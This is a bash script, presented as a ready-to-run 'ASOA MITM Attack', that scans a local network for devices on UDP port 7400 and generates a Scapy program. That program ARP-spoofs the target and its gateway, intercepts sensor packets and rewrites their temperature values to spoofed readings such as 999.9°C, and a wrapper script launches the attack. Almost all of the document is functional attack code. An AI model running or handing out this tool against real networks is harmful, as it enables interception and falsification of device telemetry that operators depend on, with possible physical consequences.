#!/bin/bash

# ASOA MITM Attack - Plug and Play for macOS
# Automatically detects target and runs MITM attack

set -e

echo "🎯 ASOA MITM Attack - Plug and Play"
echo "==================================="

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_header() {
    echo -e "${BLUE}[ATTACK]${NC} $1"
}

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   print_error "This script must be run as root (use sudo)"
   exit 1
fi

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

print_header "Step 1: Installing Dependencies"
print_status "Installing required packages..."

# Install Homebrew if not present
if ! command -v brew &> /dev/null; then
    print_status "Installing Homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
fi

# Install required packages
brew install python3 scapy tcpdump dsniff

print_header "Step 2: Installing Python Dependencies"
# Create virtual environment
if [ ! -d "mitm_env" ]; then
    print_status "Creating Python virtual environment..."
    python3 -m venv mitm_env
fi

# Activate virtual environment
source mitm_env/bin/activate

# Install Python packages
print_status "Installing Python packages..."
pip install scapy netifaces psutil colorama pyyaml requests

print_header "Step 3: Network Discovery"
print_status "Scanning network for ASOA devices..."

# Get local network
LOCAL_IP=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | head -1)
NETWORK=$(echo $LOCAL_IP | cut -d. -f1-3)

print_status "Local IP: $LOCAL_IP"
print_status "Network: $NETWORK.0/24"

# Scan for devices with UDP port 7400 open
print_status "Scanning for ASOA devices (UDP port 7400)..."
TARGETS=()

for i in {1..254}; do
    IP="$NETWORK.$i"
    if timeout 1 bash -c "</dev/tcp/$IP/7400" 2>/dev/null || nc -zu $IP 7400 2>/dev/null; then
        TARGETS+=($IP)
        print_status "Found ASOA device: $IP"
    fi
done

if [ ${#TARGETS[@]} -eq 0 ]; then
    print_warning "No ASOA devices found automatically"
    print_status "Please enter the target Raspberry Pi IP manually:"
    read -p "Target IP: " MANUAL_TARGET
    TARGETS=($MANUAL_TARGET)
fi

if [ ${#TARGETS[@]} -eq 0 ]; then
    print_error "No target specified. Exiting."
    exit 1
fi

TARGET_IP=${TARGETS[0]}
print_status "Target IP: $TARGET_IP"

print_header "Step 4: Creating MITM Attack Script"
cat > asoa_mitm_attack.py << 'EOF'
#!/usr/bin/env python3

import sys
import time
import signal
import threading
from scapy.all import *
import netifaces
import os

class ASOAMITMAttack:
    def __init__(self, target_ip, spoofed_temp=999.9):
        self.target_ip = target_ip
        self.spoofed_temp = spoofed_temp
        self.running = False
        self.intercepted_packets = 0
        self.modified_packets = 0
        
        # Get gateway IP
        self.gateway_ip = self.get_gateway_ip()
        print(f"🎯 Target: {self.target_ip}")
        print(f"🌐 Gateway: {self.gateway_ip}")
        print(f"🌡️ Spoofed Temperature: {self.spoofed_temp}°C")
        
    def get_gateway_ip(self):
        """Get default gateway IP"""
        gws = netifaces.gateways()
        return gws['default'][netifaces.AF_INET][0]
    
    def arp_spoof(self):
        """ARP spoofing to intercept traffic"""
        print("🔄 Starting ARP spoofing...")
        
        # Spoof target to think we are gateway
        target_to_gateway = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwsrc=get_if_hwaddr(conf.iface))
        # Spoof gateway to think we are target
        gateway_to_target = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwsrc=get_if_hwaddr(conf.iface))
        
        while self.running:
            try:
                send(target_to_gateway, verbose=False)
                send(gateway_to_target, verbose=False)
                time.sleep(2)
            except KeyboardInterrupt:
                break
    
    def packet_handler(self, packet):
        """Handle intercepted packets"""
        if packet.haslayer(UDP) and packet[UDP].dport == 7400:
            self.intercepted_packets += 1
            print(f"📡 Intercepted ASOA packet #{self.intercepted_packets}: {packet[IP].src}:{packet[UDP].sport} -> {packet[IP].dst}:{packet[UDP].dport}")
            
            # Try to modify temperature data
            if self.modify_temperature_packet(packet):
                self.modified_packets += 1
                print(f"🌡️ Temperature modified to {self.spoofed_temp}°C")
                
                # Forward modified packet
                try:
                    send(packet, verbose=False)
                    print(f"💉 Sent modified packet to {packet[IP].dst}:{packet[UDP].dport}")
                except Exception as e:
                    print(f"❌ Failed to send packet: {e}")
    
    def modify_temperature_packet(self, packet):
        """Modify temperature data in ASOA packet"""
        try:
            # Look for temperature patterns in payload
            if packet.haslayer(Raw):
                payload = packet[Raw].load
                
                # Simple temperature pattern matching
                # Look for float values that could be temperature
                import struct
                import re
                
                # Try to find float values in payload
                float_pattern = re.compile(rb'[\x00-\xff]{4}')  # 4-byte patterns
                matches = float_pattern.findall(payload)
                
                for i, match in enumerate(matches):
                    try:
                        # Try to interpret as float
                        value = struct.unpack('f', match)[0]
                        if 0 <= value <= 100:  # Likely temperature range
                            print(f"🌡️ Found temperature value: {value}°C")
                            
                            # Replace with spoofed temperature
                            new_value = struct.pack('f', self.spoofed_temp)
                            new_payload = payload.replace(match, new_value)
                            
                            # Update packet
                            packet[Raw].load = new_payload
                            
                            # Recalculate checksums
                            del packet[UDP].chksum
                            del packet[IP].chksum
                            
                            return True
                    except:
                        continue
                        
        except Exception as e:
            print(f"⚠️ Error modifying packet: {e}")
        
        return False
    
    def start_attack(self):
        """Start the MITM attack"""
        print("🚀 Starting ASOA MITM Attack...")
        self.running = True
        
        # Start ARP spoofing in background
        arp_thread = threading.Thread(target=self.arp_spoof)
        arp_thread.daemon = True
        arp_thread.start()
        
        # Start packet sniffing
        print("📡 Starting packet sniffing on UDP port 7400...")
        try:
            sniff(filter=f"udp port 7400 and host {self.target_ip}", 
                  prn=self.packet_handler, 
                  store=0,
                  stop_filter=lambda x: not self.running)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop_attack()
    
    def stop_attack(self):
        """Stop the MITM attack"""
        print("\n🛑 Stopping MITM attack...")
        self.running = False
        
        # Restore ARP tables
        print("🔄 Restoring ARP tables...")
        gateway_mac = getmacbyip(self.gateway_ip)
        target_mac = getmacbyip(self.target_ip)
        
        if gateway_mac and target_mac:
            restore_arp = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=target_mac, hwsrc=gateway_mac)
            send(restore_arp, verbose=False)
        
        print(f"📊 Attack Summary:")
        print(f"   - Intercepted packets: {self.intercepted_packets}")
        print(f"   - Modified packets: {self.modified_packets}")
        print("✅ MITM attack stopped")

def signal_handler(sig, frame):
    print("\n🛑 Interrupt received, stopping attack...")
    if hasattr(signal_handler, 'attack'):
        signal_handler.attack.stop_attack()
    sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 asoa_mitm_attack.py <target_ip> [spoofed_temperature]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    spoofed_temp = float(sys.argv[2]) if len(sys.argv) > 2 else 999.9
    
    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create and start attack
    attack = ASOAMITMAttack(target_ip, spoofed_temp)
    signal_handler.attack = attack
    
    try:
        attack.start_attack()
    except KeyboardInterrupt:
        attack.stop_attack()
EOF

print_header "Step 5: Creating Quick Attack Script"
cat > quick_attack.sh << EOF
#!/bin/bash

# Quick ASOA MITM Attack
TARGET_IP="$TARGET_IP"
SPOOFED_TEMP=\${1:-999.9}

echo "🎯 Quick ASOA MITM Attack"
echo "Target: \$TARGET_IP"
echo "Spoofed Temperature: \$SPOOFED_TEMP°C"
echo ""

# Activate virtual environment
source mitm_env/bin/activate

# Run attack
python3 asoa_mitm_attack.py "\$TARGET_IP" "\$SPOOFED_TEMP"
EOF

chmod +x quick_attack.sh
chmod +x asoa_mitm_attack.py

print_header "Step 6: Attack Ready!"
echo "✅ MITM attack system is now plug-and-play!"
echo ""
echo "🎯 Quick Attack Commands:"
echo "  ./quick_attack.sh                    # Attack with 999.9°C"
echo "  ./quick_attack.sh 500.0              # Attack with 500.0°C"
echo "  ./quick_attack.sh 1234.5             # Attack with 1234.5°C"
echo ""
echo "📡 Manual Attack:"
echo "  source mitm_env/bin/activate"
echo "  python3 asoa_mitm_attack.py $TARGET_IP 999.9"
echo ""
echo "🎯 Target Information:"
echo "  - Protocol: UDP"
echo "  - Port: 7400"
echo "  - Target IP: $TARGET_IP"
echo "  - Service: Temperature sensor → Dashboard"
echo ""
echo "🚀 Ready to attack! Just run: ./quick_attack.sh"
